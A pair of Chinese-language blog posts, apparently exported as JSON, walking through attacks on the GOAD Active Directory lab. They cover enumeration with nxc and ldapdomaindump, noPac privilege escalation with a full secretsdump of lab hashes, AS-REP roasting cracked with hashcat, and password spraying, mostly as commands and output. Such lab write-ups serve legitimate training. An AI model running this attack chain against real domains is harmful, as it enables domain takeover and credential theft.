[{"title":"GOAD-Wirteup_Part1(废弃)","url":"/GOAD-Wirteup-Part1/","content":"网上看见了一个非常好的域渗透练习项目GOAD，搭建这块就不说了，直接开始。\n信息收集扫描nxc smb 192.168.56.0/24\n\n有三台机器signing:True，根据经验判断这三台为域控，我们可以再扫一下LDAP端口进行验证\nnxc ldap 192.168.56.0/24\n\n将这些机器添加进HOSTS文件中，以备后面使用Kerberos相关服务。\n寻找域账号当域控能被匿名SMB连接时能枚举到域账号\nnxc smb 192.168.56.0/24 --users\n\n这就直接给我们一个账号密码，只能说靶场就是靶场。\nsamwell.tarly:Heartsbane\n获取域信息这样我们就能通过LDAP认证获取更多的信息\n┌──(kali㉿kali)-[~]└─$ ldapdomaindump -u &#x27;NORTH.SEVENKINGDOMS.LOCAL\\samwell.tarly&#x27; -p Heartsbane -o NORTH.SEVENKINGDOMS.LOCAL 192.168.56.11[*] Connecting to host...[*] Binding to host[+] Bind OK[*] Starting domain dump[+] Domain dump finished\n\n很遗憾，我们获得的账号并不在Doamin Admins组里\n攻击NORTH.SEVENKINGDOMS.LOCAL我们目前有两台机器在NORTH.SEVENKINGDOMS.LOCAL域内\nSMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)\n\n通过LdapDomainDump的数据，有两名域管理员\neddaard.starkAdministrator\n\n并且有一个域用户的帐号密码\nsamwell.tarly:Heartsbane\n当有域账户时可以扫描域用户权限提升漏洞，如noPac，PrintNightmare\n我们可以使用Netexec进行扫描\n┌──(kali㉿kali)-[~/Downloads/krbrelayx-master]└─$ nxc smb 192.168.56.11 -u samwell.tarly -p -M nopac -M spoolerSMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\\samwell.tarly:HeartsbaneNOPAC       192.168.56.11   445    WINTERFELL       TGT with PAC size 1654NOPAC       192.168.56.11   445    WINTERFELL       TGT without PAC size 817NOPAC       192.168.56.11   445    WINTERFELLNOPAC       192.168.56.11   445    WINTERFELL       VULNERABLENOPAC       192.168.56.11   445    WINTERFELL       Next step: https://github.com/Ridter/noPacSPOOLER     192.168.56.11   445    WINTERFELL       Spooler service enabled\n\n我们可以直接使用https://github.com/Ridter/noPac\n┌──(noPac)─(kali㉿kali)-[~/Downloads/noPac]└─$ python3 noPac.py north.sevenkingdoms.local/samwell.tarly:Heartsbane -dc-ip 192.168.56.11███    ██  ██████  ██████   █████   ██████████   ██ ██    ██ ██   ██ ██   ██ ████ ██  ██ ██    ██ ██████  ███████ ████  ██ ██ ██    ██ ██      ██   ██ ████   ████  ██████  ██      ██   ██  ██████[*] Current ms-DS-MachineAccountQuota = 10[*] Selected Target winterfell.north.sevenkingdoms.local[*] Total Domain Admins 3[*] will try to impersonate eddard.stark[*] Adding Computer Account &quot;WIN-SXKFGMHCLVY$&quot;[*] MachineAccount &quot;WIN-SXKFGMHCLVY$&quot; password = 19EqF0n0imc2[*] Successfully added machine account WIN-SXKFGMHCLVY$ with password 19EqF0n0imc2.[*] WIN-SXKFGMHCLVY$ object = CN=WIN-SXKFGMHCLVY,CN=Computers,DC=north,DC=sevenkingdoms,DC=local[*] WIN-SXKFGMHCLVY$ sAMAccountName == winterfell[*] Saving a DC&#x27;s ticket in winterfell.ccache[*] Reseting the machine account to WIN-SXKFGMHCLVY$[*] Restored WIN-SXKFGMHCLVY$ sAMAccountName to original value[*] Using TGT from cache[*] Impersonating eddard.stark[*] \tRequesting S4U2self[*] Saving a user&#x27;s ticket in eddard.stark.ccache[*] Rename ccache to eddard.stark_winterfell.north.sevenkingdoms.local.ccache[*] Attempting to del a computer with the name: WIN-SXKFGMHCLVY$[-] Delete computer WIN-SXKFGMHCLVY$ Failed! Maybe the current user does not have permission.\n\n显示删除机器账户失败，没关系，票据申请到了就行。\n使用secretsdump进行dump\n┌──(kali㉿kali)-[~/Downloads/noPac]└─$ ls -lian eddard.stark_winterfell.north.sevenkingdoms.local.ccache3689526 -rw-rw-r-- 1 1000 1000 1545 Dec 20 10:03 eddard.stark_winterfell.north.sevenkingdoms.local.ccache┌──(kali㉿kali)-[~/Downloads/noPac]└─$export KRB5CCNAME=eddard.stark_winterfell.north.sevenkingdoms.local.ccache3689526 -rw-rw-r-- 1 1000 1000 1545 Dec 20 10:03 eddard.stark_winterfell.north.sevenkingdoms.local.ccache┌──(kali㉿kali)-[~/Downloads/noPac]└─$ impacket-secretsdump -k -no-pass eddard.stark@winterfell.north.sevenkingdoms.local -just-dcImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1afc3352b8464b283bc168d3dd935c78:::vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::arya.stark:1110:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::eddard.stark:1111:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::catelyn.stark:1112:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::robb.stark:1113:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::sansa.stark:1114:aad3b435b51404eeaad3b435b51404ee:b777555c2e2e3716e075cc255b26c14d:::brandon.stark:1115:aad3b435b51404eeaad3b435b51404ee:84bbaa1c58b7f69d2192560a3f932129:::rickon.stark:1116:aad3b435b51404eeaad3b435b51404ee:7978dc8a66d8e480d9a86041f8409560:::hodor:1117:aad3b435b51404eeaad3b435b51404ee:337d2667505c203904bd899c6c95525e:::jon.snow:1118:aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755:::samwell.tarly:1119:aad3b435b51404eeaad3b435b51404ee:f5db9e027ef824d029262068ac826843:::jeor.mormont:1120:aad3b435b51404eeaad3b435b51404ee:6dccf1c567c56a40e56691a723a49664:::sql_svc:1121:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::north.sevenkingdoms.local\\admin01:1125:aad3b435b51404eeaad3b435b51404ee:ebdf1f3a95ab808bbf01ecec1ebdc7ee:::WINTERFELL$:1001:aad3b435b51404eeaad3b435b51404ee:019b67b6b314f318bda1fcdf56fdec45:::CASTELBLACK$:1105:aad3b435b51404eeaad3b435b51404ee:3a5c1723373cbe24b801b1cfecf6cec7:::DESKTOP-HKO7PPDH$:1122:aad3b435b51404eeaad3b435b51404ee:05c7bca85e213cdea0ce9fc93a5c5952:::krbrelay$:1123:aad3b435b51404eeaad3b435b51404ee:0eddedc35eb7b7ecde0c9f0564e54c83:::win11$:1124:aad3b435b51404eeaad3b435b51404ee:106d6be7c86c1248e9f29410bf52891d:::Test123$:1126:aad3b435b51404eeaad3b435b51404ee:4b130d040e6349f2813703bb671fef45:::Test234$:1127:aad3b435b51404eeaad3b435b51404ee:04c53682276ad85b0680d03cbb608129:::Test456$:1128:aad3b435b51404eeaad3b435b51404ee:04c53682276ad85b0680d03cbb608129:::cd1234..$:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::WIN-SXKFGMHCLVY$:1131:aad3b435b51404eeaad3b435b51404ee:079b73f9d179047c70481513e24a60b1:::SEVENKINGDOMS$:1104:aad3b435b51404eeaad3b435b51404ee:34831d00299c3d29c2e48fa7444afe8d:::[*] Kerberos keys grabbedAdministrator:aes256-cts-hmac-sha1-96:e7aa0f8a649aa96fab5ed9e65438392bfc549cb2695ac4237e97996823619972Administrator:aes128-cts-hmac-sha1-96:bb7b6aed58a7a395e0e674ac76c28aa0Administrator:des-cbc-md5:fe58cdcd13a43243krbtgt:aes256-cts-hmac-sha1-96:2b2a02d222c517711baf01c1254a00ada695fd849fc8f0e92210587e10e257aakrbtgt:aes128-cts-hmac-sha1-96:7a2021c885bcfc796aa694921c5a8b4akrbtgt:des-cbc-md5:944032f875df7576vagrant:aes256-cts-hmac-sha1-96:aa97635c942315178db04791ffa240411c36963b5a5e775e785c6bd21dd11c24vagrant:aes128-cts-hmac-sha1-96:0d7c6160ffb016857b9af96c44110ab1vagrant:des-cbc-md5:16dc9e8ad3dfc47farya.stark:aes256-cts-hmac-sha1-96:2001e8fb3da02f3be6945b4cce16e6abdd304974615d6feca7d135d4009d4f7darya.stark:aes128-cts-hmac-sha1-96:8477cba28e7d7cfe5338d172a23d74dfarya.stark:des-cbc-md5:13525243d6643285eddard.stark:aes256-cts-hmac-sha1-96:f6b4d01107eb34c0ecb5f07d804fa9959dce6643f8e4688df17623b847ec7fc4eddard.stark:aes128-cts-hmac-sha1-96:5f9b06a24b90862367ec221a11f92203eddard.stark:des-cbc-md5:8067f7abecc7d346catelyn.stark:aes256-cts-hmac-sha1-96:c8302e270b04252251de40b2bd5fba37395b55d5ed9ac95e03213dc739827283catelyn.stark:aes128-cts-hmac-sha1-96:50ce7e2ad069fa40fb2bc7f5f9643d93catelyn.stark:des-cbc-md5:6b314670a2f84cfbrobb.stark:aes256-cts-hmac-sha1-96:d7df5069178bbc93fdc34bbbcb8e374fd75c44d6ce51000f24688925cc4d9c2arobb.stark:aes128-cts-hmac-sha1-96:b2965905e68356d63fedd9904357cc42robb.stark:des-cbc-md5:c4b62c797f5dd01fsansa.stark:aes256-cts-hmac-sha1-96:a268e7a385f4f165c6489c18a3bdeb52c5e505050449c6f9aeba4bc06a7fcbedsansa.stark:aes128-cts-hmac-sha1-96:e2e6e885f6f4d3e25d759ea624961392sansa.stark:des-cbc-md5:4c7c16e3f74cc4d3brandon.stark:aes256-cts-hmac-sha1-96:6dd181186b68898376d3236662f8aeb8fa68e4b5880744034d293d18b6753b10brandon.stark:aes128-cts-hmac-sha1-96:9de3581a163bd056073b71ab23142d73brandon.stark:des-cbc-md5:76e61fda8a4f5245rickon.stark:aes256-cts-hmac-sha1-96:79ffda34e5b23584b3bd67c887629815bb9ab8a1952ae9fda15511996587dcdarickon.stark:aes128-cts-hmac-sha1-96:d4a0669b1eff6caa42f2632ebca8cd8drickon.stark:des-cbc-md5:b9ec3b8f2fd9d98ahodor:aes256-cts-hmac-sha1-96:a33579ec769f3d6477a98e72102a7f8964f09a745c1191a705d8e1c3ab6e4287hodor:aes128-cts-hmac-sha1-96:929126dcca8c698230b5787e8f5a5b60hodor:des-cbc-md5:d5764373f2545dfdjon.snow:aes256-cts-hmac-sha1-96:5a1bc13364e758131f87a1f37d2f1b1fa8aa7a4be10e3fe5a69e80a5c4c408fbjon.snow:aes128-cts-hmac-sha1-96:d8bc99ccfebe2d6e97d15f147aa50e8bjon.snow:des-cbc-md5:084358ceb3290d7csamwell.tarly:aes256-cts-hmac-sha1-96:b66738c4d2391b0602871d0a5cd1f9add8ff6b91dcbb7bc325dc76986496c605samwell.tarly:aes128-cts-hmac-sha1-96:3943b4ac630b0294d5a4e8b940101faesamwell.tarly:des-cbc-md5:5efed0e0a45dd951jeor.mormont:aes256-cts-hmac-sha1-96:be10f893afa35457fcf61ecc40dc032399b7aee77c87bb71dd2fe91411d2bd50jeor.mormont:aes128-cts-hmac-sha1-96:1b0a98958e19d6092c8e8dc1d25c788bjeor.mormont:des-cbc-md5:1a68641a3e9bb6easql_svc:aes256-cts-hmac-sha1-96:24d57467625d5510d6acfddf776264db60a40c934fcf518eacd7916936b1d6afsql_svc:aes128-cts-hmac-sha1-96:01290f5b76c04e39fb2cb58330a22029sql_svc:des-cbc-md5:8645d5cd402f16c7north.sevenkingdoms.local\\admin01:aes256-cts-hmac-sha1-96:932317d6c409d624aea9f223a3d47ec9042b4e7d0bc856324e918189ccf33c97north.sevenkingdoms.local\\admin01:aes128-cts-hmac-sha1-96:6fa2d0782fe5a9a8946acdc34779b905north.sevenkingdoms.local\\admin01:des-cbc-md5:bab51aeca1ec1ca7WINTERFELL$:aes256-cts-hmac-sha1-96:9f46dd231e24cd29a4fb9c92cc4bfb52ac90c4afedad4527ca3b3b879b9682b2WINTERFELL$:aes128-cts-hmac-sha1-96:528ed5d9308e2a82a0d68748cb5d6c81WINTERFELL$:des-cbc-md5:7ff72c75d5d683b5CASTELBLACK$:aes256-cts-hmac-sha1-96:6f5423d17fd317a6bec4cfb0fe0872bfc43597cb622351b9c8ccfeca38d3be62CASTELBLACK$:aes128-cts-hmac-sha1-96:ccdacc849a0c9800078212adb3f6f851CASTELBLACK$:des-cbc-md5:6e68a4a19454349bDESKTOP-HKO7PPDH$:aes256-cts-hmac-sha1-96:86c358a1374a7734c9da842e359e3fae878e7fcbe68ba40cf9dc61a399842f51DESKTOP-HKO7PPDH$:aes128-cts-hmac-sha1-96:b4df35e06ffe272af05bf23c130d8d07DESKTOP-HKO7PPDH$:des-cbc-md5:687c19cdaba49132krbrelay$:aes256-cts-hmac-sha1-96:9b24562bed8ff22f72ddb14c597c74889100ce2b84749a396b4af47876be2f7fkrbrelay$:aes128-cts-hmac-sha1-96:513eabc0aa30a686a2e5fb4b937615efkrbrelay$:des-cbc-md5:aec4043738c7e38cwin11$:aes256-cts-hmac-sha1-96:1a0872d983af4250b4eac66af59fdb3c57a35ccd1967420228810c526a35915ewin11$:aes128-cts-hmac-sha1-96:221795e2c6278e258edcb2750355adc5win11$:des-cbc-md5:04fea88c9419a432Test123$:aes256-cts-hmac-sha1-96:ddec45e9ba6aa0c87f5bfe1f732eda7bb66c97486beb7c69b0cfb8cddeef28eeTest123$:aes128-cts-hmac-sha1-96:6341bf5ed96823f7d39af437c07a2e92Test123$:des-cbc-md5:e07a4adc325d2c9eTest234$:aes256-cts-hmac-sha1-96:f8746b95c42047051fa169f81b58ec88e1f8aac60dfe2c58cecab09b116ca32fTest234$:aes128-cts-hmac-sha1-96:5114a367c629151d9e92c70ef2a74eccTest234$:des-cbc-md5:97d686b997920bdcTest456$:aes256-cts-hmac-sha1-96:0cf0c36a22200e0c87471cfc84b4c2ca3b2824d49af6c8bcc271e10b77acb653Test456$:aes128-cts-hmac-sha1-96:707002b94973e6a27446b574a09fa4c4Test456$:des-cbc-md5:5bd6d319d5b0524aWIN-SXKFGMHCLVY$:aes256-cts-hmac-sha1-96:9116d96c8434751c276e7201cd20bad12794d60eedb700f036b3bc259d1cbb5fWIN-SXKFGMHCLVY$:aes128-cts-hmac-sha1-96:35f20ca5201ec3b910164ea74b0628ccWIN-SXKFGMHCLVY$:des-cbc-md5:1f324697b66e7f3eSEVENKINGDOMS$:aes256-cts-hmac-sha1-96:b06b661d4b02880e55e846888400f36a46c37b492baf9fca43c181498b0081ccSEVENKINGDOMS$:aes128-cts-hmac-sha1-96:bc137e4170c0c00794c618de0606988eSEVENKINGDOMS$:des-cbc-md5:f483da8651026b86[*] Cleaning up...\n\n后面就可以用Administrator的Hash去删除我们注册的域机器账户，这里就不再赘述。\n"},{"title":"GOAD-Journey-Part1","url":"/GOAD-Journey-Part1/","content":"上一篇文章写的有点乱，既然是博客，应该事无巨细的写一篇教程文。此篇我将从域渗透教学的角度来描述如何一步步渗透进入GOAD。\n扫描和侦查网络扫描NETEXEC简单探测在域渗透中，我们可以通过NetExec进行简单的域内Windows扫描\nnxc smb 192.168.56.0/24\n\n\n我们可知当前有三个域\nessos.localsevenkingdoms.localnorth.sevenkingdoms.local\n\n通过signing:True，可猜测这三台就是域控，使用Ldap端口扫描\nnxc ldap 192.168.56.0/24\n\n\n可以确定有三台域控。\n配置HOSTS我们需要在本地机器上设置hosts文件，以便后续使用Kerberos协议\n# /etc/hosts# GOAD192.168.56.10   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding192.168.56.11   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell192.168.56.12   essos.local meereen.essos.local meereen192.168.56.22   castelblack.north.sevenkingdoms.local castelblack192.168.56.23   braavos.essos.local braavos\n\nNMAP全端口扫描为了扩充攻击面，我们将对目前已知的机器进行全端口扫描\nnmap -Pn -p- -sC -sV -oA full_scan 192.168.56.10-12,22-23\n\n解读一下这些参数\n-Pn 不使用ping来探活\n-p- 扫描全端口\n-sc运行默认的侦察脚本\n-sV 探测系统版本\n-oA用三种结果保存到 full_scan\n扫描结果太长了就不展示了\n分析扫描结果通过sevenkingdoms.local和essos.local，在google上搜索，可以判定为《权力的游戏》或者是《冰与火之歌》有关的域。虽然这是一个靶场，但是我们也可以在实战中运用这项社会工程学技能。\n\n寻找域用户在域控上匿名枚举域账号nxc smb 192.168.56.0/24 --users\n\n\n我们在WINTERFELL.NORTH.SEVENKINGDOMS.LOCAL中枚举到了十个域账号，并且意外收获了一个密码\nsamwell.tarly:Heartsbane\n这些账号我们也可以验证我们在上一步的OSINT，我们寻找的是正确的信息。\n\n有密码时我们可以使用ldapdomaindump来获取域信息。\n┌──(kali㉿kali)-[~]└─$ ldapdomaindump -u &#x27;NORTH.SEVENKINGDOMS.LOCAL\\samwell.tarly&#x27; -p Heartsbane -o NORTH.SEVENKINGDOMS.LOCAL 192.168.56.11[*] Connecting to host...[*] Binding to host[+] Bind OK[*] Starting domain dump[+] Domain dump finished\n\n我们获得了NORTH.SEVENKINGDOMS.LOCAL上所有的账户\n暴力枚举帐号通过OSINT获取账号名，并将其按照另一个域名上格式来设置密码。(这种格式在大多域内都是通用的)\n可以写一个简单的sh脚本\n#!/bin/bash# Fetch webpage and extract character namescurl -s &quot;https://www.hbomax.com/shows/game-of-thrones/4f6b4985-2dc9-4ab6-ac79-d60f0860b0ac/cast-and-crew&quot; | \\grep -o &#x27;&gt;[A-Z][a-z]* [A-Z][a-z]*&lt;&#x27; | \\sed &#x27;s/&gt;//g; s/&lt;//g&#x27; | \\awk &#x27;BEGIN &#123; count = 0 &#125;&#123;    count++    if (count &gt; 11 &amp;&amp; (count - 12) % 2 == 0) &#123;        # Convert to lowercase and replace spaces with dots        name = tolower($0)        gsub(/ /, &quot;.&quot;, name)        print name    &#125;&#125;&#x27; | \\sort | uniq\n\n我们可以使用kerbrute来进行账号名爆破\n┌──(kali㉿kali)-[~]└─$ kerbrute userenum -d essos.local --dc 192.168.56.12 got_users.txt    __             __               __   / /_____  _____/ /_  _______  __/ /____  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/Version: v1.0.3 (9dad6e1) - 12/21/25 - Ronnie Flathers @ropnop2025/12/21 06:32:31 &gt;  Using KDC(s):2025/12/21 06:32:31 &gt;  \t192.168.56.12:882025/12/21 06:32:31 &gt;  [+] VALID USERNAME:\t daenerys.targaryen@essos.local2025/12/21 06:32:31 &gt;  [+] VALID USERNAME:\t jorah.mormont@essos.local2025/12/21 06:32:31 &gt;  [+] VALID USERNAME:\t khal.drogo@essos.local2025/12/21 06:32:31 &gt;  [+] VALID USERNAME:\t viserys.targaryen@essos.local2025/12/21 06:32:36 &gt;  Done! Tested 80 usernames (4 valid) in 5.003 seconds\n\n也可以用nmap进行账号爆破，我们在另一个域上用nmap试一下\n┌──(kali㉿kali)-[~]└─$ nmap -p 88 --script=krb5-enum-users --script-args=&quot;krb5-enum-users.realm=&#x27;sevenkingdoms.local&#x27;,userdb=got_users.txt&quot; 192.168.56.10Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 06:32 ESTNmap scan report for sevenkingdoms.local (192.168.56.10)Host is up (0.00035s latency).PORT   STATE SERVICE88/tcp open  kerberos-sec| krb5-enum-users:| Discovered Kerberos principals|     robert.baratheon@sevenkingdoms.local|_    stannis.baratheon@sevenkingdoms.localMAC Address: 00:0C:29:CC:C8:38 (VMware)Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds\n\n寻找未授权的SMB┌──(kali㉿kali)-[~]└─$ nxc smb 192.168.56.0/24 -u &#x27;a&#x27; -p &#x27;&#x27; --sharesSMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)SMB         192.168.56.12   445    MEEREEN          [*] Windows 10 / Server 2016 Build 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)SMB         192.168.56.10   445    KINGSLANDING     [-] sevenkingdoms.local\\a: STATUS_LOGON_FAILURESMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\\a: STATUS_LOGON_FAILURESMB         192.168.56.23   445    BRAAVOS          [*] Windows 10 / Server 2016 Build 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)SMB         192.168.56.12   445    MEEREEN          [-] essos.local\\a: STATUS_LOGON_FAILURESMB         192.168.56.22   445    CASTELBLACK      [-] north.sevenkingdoms.local\\a: STATUS_LOGON_FAILURESMB         192.168.56.23   445    BRAAVOS          [+] essos.local\\a: (Guest)SMB         192.168.56.23   445    BRAAVOS          [*] Enumerated sharesSMB         192.168.56.23   445    BRAAVOS          Share           Permissions     RemarkSMB         192.168.56.23   445    BRAAVOS          -----           -----------     ------SMB         192.168.56.23   445    BRAAVOS          ADMIN$                          Remote AdminSMB         192.168.56.23   445    BRAAVOS          all             READ,WRITE      Basic RW share for allSMB         192.168.56.23   445    BRAAVOS          C$                              Default shareSMB         192.168.56.23   445    BRAAVOS          CertEnroll                      Active Directory Certificate Services shareSMB         192.168.56.23   445    BRAAVOS          IPC$            READ            Remote IPCSMB         192.168.56.23   445    BRAAVOS          public                          Basic Read share for all domain usersRunning nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00\n\n有一个可读写\n有用户名但是没有密码的情况ASREP - roasting比如说咱之前在north.sevenkingdoms.local 上ldapdomaindump获取的所有用户名。\nsql_svcjeor.mormontsamwell.tarlyjon.snowhodorrickon.starkbrandon.starksansa.starkrobb.starkcatelyn.starkeddard.starkarya.starkkrbtgtvagrantGuestAdministrator\n\n保存到users.txt\n┌──(kali㉿kali)-[~]└─$ impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -usersfile users.txtImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[-] User sql_svc doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User jeor.mormont doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User samwell.tarly doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User jon.snow doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User hodor doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User rickon.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:c0d425fe45c54c3c18e875898bca120f$45ac4cb030568708dae3e1c6c2dc5777628b03f8c2a0c33cde1affe1005f3877c51d8c71a551bc2cec9d65b66ca4ee3dfac29d86e5adf504a3e1e627624951d1783896c0171c86530661894964b1faac172a3ba01fc851b43d54bfdec323e1502a9435f97a98c71c3a5794faeb1898393f448a387bef9483880de57fb38e9a3a16ff3709f6c01f5d51389a7e867d520ae37f30b1c5968abeeab45d0046d2e55f2235a94051938f261fb0fb4e91186c7588e0bb935b4dee180f0d66ac7d3c0cee54c0f78842495c662376e32815da9ca43d5a064d6af83336925e5634bd10f7cc60d4d9d7f9b3f4367b813d83dcf4f3e86dc18fd7ce2486aeaeca61b9c5d547ccb498d6bfa114[-] User sansa.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User robb.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User catelyn.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User eddard.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User arya.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User vagrant doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User Administrator doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set\n\n这就获取到的brandon.stark的票据。然后用hashcat去破解他\n┌──(kali㉿kali)-[~]└─$ hashcat -m 18200 asrephash.txt /usr/share/wordlists/rockyou.txthashcat (v7.1.2) startingOpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]====================================================================================================================================================* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900H, 6956/13913 MB (2048 MB allocatable), 4MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Minimum salt length supported by kernel: 0Maximum salt length supported by kernel: 256Hashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Not-Iterated* Single-Hash* Single-SaltATTENTION! Pure (unoptimized) backend kernels selected.Pure kernels can crack longer passwords, but drastically reduce performance.If you want to switch to optimized kernels, append -O to your commandline.See the above message to find out about the exact limits.Watchdog: Temperature abort trigger set to 90cHost memory allocated for this attack: 513 MB (11083 MB free)Dictionary cache built:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344392* Bytes.....: 139921507* Keyspace..: 14344385* Runtime...: 1 sec$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:c0d425fe45c54c3c18e875898bca120f$45ac4cb030568708dae3e1c6c2dc5777628b03f8c2a0c33cde1affe1005f3877c51d8c71a551bc2cec9d65b66ca4ee3dfac29d86e5adf504a3e1e627624951d1783896c0171c86530661894964b1faac172a3ba01fc851b43d54bfdec323e1502a9435f97a98c71c3a5794faeb1898393f448a387bef9483880de57fb38e9a3a16ff3709f6c01f5d51389a7e867d520ae37f30b1c5968abeeab45d0046d2e55f2235a94051938f261fb0fb4e91186c7588e0bb935b4dee180f0d66ac7d3c0cee54c0f78842495c662376e32815da9ca43d5a064d6af83336925e5634bd10f7cc60d4d9d7f9b3f4367b813d83dcf4f3e86dc18fd7ce2486aeaeca61b9c5d547ccb498d6bfa114:iseedeadpeople\n\n这就获取到了brandon.stark的密码为iseedeadpeople\n密码喷洒一种是用户名和密码一样的情况下(现实情况下非常少)\n┌──(kali㉿kali)-[~]└─$ nxc smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforceSMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\\sql_svc:sql_svc STATUS_LOGON_FAILURESMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\\jeor.mormont:jeor.mormont STATUS_LOGON_FAILURESMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\\samwell.tarly:samwell.tarly STATUS_LOGON_FAILURESMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\\jon.snow:jon.snow STATUS_LOGON_FAILURESMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\\hodor:hodor\n\n第二种是部分密码复用的情况，可以用kerbrute，非常快\n┌──(kali㉿kali)-[~]└─$ kerbrute passwordspray -d north.sevenkingdoms.local --dc 192.168.56.11 users.txt hodor    __             __               __   / /_____  _____/ /_  _______  __/ /____  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/Version: v1.0.3 (9dad6e1) - 12/21/25 - Ronnie Flathers @ropnop2025/12/21 06:56:44 &gt;  Using KDC(s):2025/12/21 06:56:44 &gt;  \t192.168.56.11:882025/12/21 06:56:44 &gt;  [+] VALID LOGIN:\t hodor@north.sevenkingdoms.local:hodor2025/12/21 06:56:44 &gt;  Done! Tested 16 logins (1 successes) in 0.019 seconds\n\n总结我们这次旅程总共获取了三个账户密码\n分别是\nsamwell.tarly:Heartsbane（用户描述）brandon.stark:iseedeadpeople（asreproasting）hodor:hodor (密码喷洒)\n\n\n\n文章参考Mayfly师傅较多部分。喜欢的师傅可以去看看。\n","tags":["-Active Directory"]}]